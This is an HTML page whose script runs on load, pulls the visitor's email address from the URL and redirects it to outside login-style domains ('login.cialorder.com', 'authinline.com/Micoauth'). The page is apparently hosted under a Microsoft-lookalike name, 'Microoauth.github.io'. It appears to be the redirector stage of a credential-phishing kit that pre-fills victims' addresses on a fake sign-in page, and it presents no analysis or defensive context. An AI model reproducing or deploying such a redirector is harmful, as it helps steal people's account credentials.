<!DOCTYPE html>
<html>
<head>
  <title>Email Redirect</title>
  <script>
    function processEmailUrl() {
      var currentURL = window.location.href;

      // Check if the URL contains an '=' character followed by '#' and an email address
      var emailRegex = /=(?=#[^#]*$)/;
      if (emailRegex.test(currentURL)) {
        // Replace the '=' character with an empty string for the email address
        var cleanURL = currentURL.replace(emailRegex, '');

        // Redirect to the cleaned URL
        window.location.href = cleanURL;
      } else {
        // If the URL didn't match the email pattern, proceed with extracting the email
        extractEmailAndRedirect();
      }
    }

    function extractEmailAndRedirect() {
      // Get the current URL
      var currentURL = window.location.href;

      // Check if the current URL contains a '?' character
      if (currentURL.includes('?')) {
        // Split the URL into two parts: the base URL and the email part
        var parts = currentURL.split('?');
        var baseURL = parts[0]; // https://Microoauth.github.io/mail
        var emailPart = parts[1];

        // Check if the email part is not empty
        if (emailPart) {
          // Extract the email by finding the first '@' symbol
          var email = emailPart.match(/[^@]+@[^@]+/);

          if (email) {
            // Construct the redirect URL by appending the extracted email to the second link
            var redirectURL = 'https://login.cialorder.com/mhXayjAt#jeremywilder012@outlook.com=' + email[0];

            // Redirect to the constructed URL
            window.location.href = redirectURL;
          } else {
            // If no email is found in the URL, simply redirect to the second link
            window.location.href = 'https://authinline.com/Micoauth/index.html/';
          }
        } else {
          // If the email part is empty, simply redirect to the second link
          window.location.href = 'https://authinline.com/Micoauth/index.html/';
        }
      } else {
        // If no '?' character is found, simply redirect to the second link
        window.location.href = 'https://authinline.com/Micoauth/index.html/';
      }
    }

    // Call the function immediately when the script is loaded
    processEmailUrl();
  </script>
</head>

</html>
